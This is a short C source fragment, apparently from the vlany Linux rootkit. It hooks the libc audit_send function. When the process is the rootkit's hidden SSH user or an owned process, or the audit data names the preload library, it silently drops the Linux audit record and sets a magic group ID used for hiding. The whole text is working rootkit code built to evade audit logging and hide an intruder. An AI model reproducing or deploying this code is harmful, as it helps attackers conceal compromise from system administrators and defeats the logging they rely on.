int audit_send(int fd, int type, const void *data, unsigned int size)
{
    #ifdef DEBUG
        printf("[vlany] audit_send() called\n");
    #endif

    HOOK(old_audit_send, CAUDIT_SEND);

    char sshd_str[40], *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    snprintf(sshd_str, sizeof(sshd_str), "sshd: %s", vlany_user);
    CLEAN(vlany_user);

    char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);
    if((strstr(procname_self(), sshd_str) || owned()) || strstr((char *)data, ld_preload)) { CLEAN(ld_preload); setgid(MAGIC_GID); return 0; }
    CLEAN(ld_preload);

    return old_audit_send(fd, type, data, size);
}
